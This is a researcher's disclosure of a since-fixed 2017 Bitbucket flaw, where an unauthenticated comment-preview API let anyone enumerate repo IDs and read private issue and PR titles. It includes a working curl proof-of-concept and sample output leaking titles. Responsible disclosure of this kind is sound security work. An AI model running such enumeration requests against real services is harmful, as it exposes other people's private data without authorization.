# Enumerating Bitbucket repos and private issue titles

This is a short disclosure of an already fixed vulnerability which I reported to Atlassian Security in May 2017 and that was fixed back in August 2017. It should have been published long ago, but writing this note was delayed due to me being busy with [npm password re-use](Gathering-weak-npm-credentials.md) and other things, and with a burn-out after that.

This vulnerability allowed unauthorized users to read issue/pr titles of all the private [Bitbucket](https://bitbucket.org/) repos, enumerating those using repo IDs (which look to be incremental).

I think that this has some value published even now. I'm still struggling with some personal problems, so this would be a rather short note. _I also have several more on the backlog (not related to Bitbucket, though) :wink:_.

Ref (private): [SEC-1539](https://securitysd.atlassian.net/servicedesk/customer/portal/2/SEC-1539).


## Timeline

* Reported: 2017-05-31
* Confirmed: 2017-05-31
* Fix ready: 2017-07-25
* Fix applied: 2017-08-07
* Published: 2018-05-10 15:00 UTC.

## The issue

1. Bitbucket supports Markdown in issue comments.
2. Markdown in Bitbucket comments translates `#1` to issue/pr links, e.g. like this:
  `<a href=\"/ChALkeR/hidden/issues/1/playbin\" rel=\"nofollow\" title=\"Playbin\">#1</a>`.
3. Bitbucket has comments preview, so that you could preview your comment before posting.
4. In order to do that, they use an API located at `https://bitbucket.org/!api/1.0/content-preview/`, which accepts repo id (numeric) and markdown text, and spits out formatted HTML code. That's the API their web interface itself requests to build a comment preview.
5. That API did not have any authorization control whatsoever and allowed anonymous access, which resulted in unauthorized users being able to enumerate repos (the numeric repo IDs look incremental) and extract all the private issue/PR titles. That was the issue.

## PoC

```bash
#!/bin/bash
curl 'https://bitbucket.org/!api/1.0/content-preview/' -H 'origin: https://bitbucket.org' -H 'accept-encoding: gzip, deflate, br' -H 'x-requested-with: XMLHttpRequest' -H 'x-csrftoken: 111' -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' -H 'accept: application/json, text/javascript, /; q=0.01' -H 'referer: https://bitbucket.org/' -H 'authority: bitbucket.org' -H 'cookie: csrftoken=111' --data 'content=issue #1 #2 #3 #4 #5 abc123456&repo_id='$1 --compressed
```

Produced this output (e.g. for `./get.sh 24698634`):
```json
{"markup": "<p>issue <a href=\"/ChALkeR/hidden-alert-1/issues/1/playbin\" rel=\"nofollow\" title=\"Playbin\">#1</a> <a href=\"/ChALkeR/hidden-alert-1/issues/2/poc-1-xss\" rel=\"nofollow\" title=\"PoC 1 — XSS\">#2</a> <a href=\"/ChALkeR/hidden-alert-1/issues/3/playbin-2\" rel=\"nofollow\" title=\"Playbin 2\">#3</a> <a href=\"/ChALkeR/hidden-alert-1/issues/4/playbin-3-ddd\" rel=\"nofollow\" title=\"Playbin #3 '"ddd\">#4</a> <a href=\"/ChALkeR/hidden-alert-1/issues/5/hidden\" rel=\"nofollow\" title=\"hidden\">#5</a> <a href=\"/ChALkeR/hidden-alert-1/commits/abc123456\" rel=\"nofollow\">abc123456</a></p>"}
```

Using that, the attacker was able to enumerate all the Bitbucket.org repos (that have at least one issue or a PR) with their owners,
and get the titles of all private issues.

Issue titles were unwrapped from the `#1 #2 #3 #4 #5` part — adding other numbers would have accessed other issues and exposed the titles of those.

_The «XSS» part is from another issue — see [here](Improper-markup-sanitization.md#bitbucket) to read about the Bitbucket XSS story._

---

If you have any questions to me, contact me over [Gitter](https://gitter.im/ChALkeR) (@ChALkeR) or IRC (ChALkeR@freenode).

This vulnerability report was not covered by any bounty reward programs, and I did not receive a monetary reward for it.\
If you want to support me so that I would be able to keep doing what I am doing, consider supporting me on [Patreon](https://www.patreon.com/ChALkeR).\
Current supporters are listed on my [fundraising](https://github.com/ChALkeR/fundraising#personal-fundraising) page.
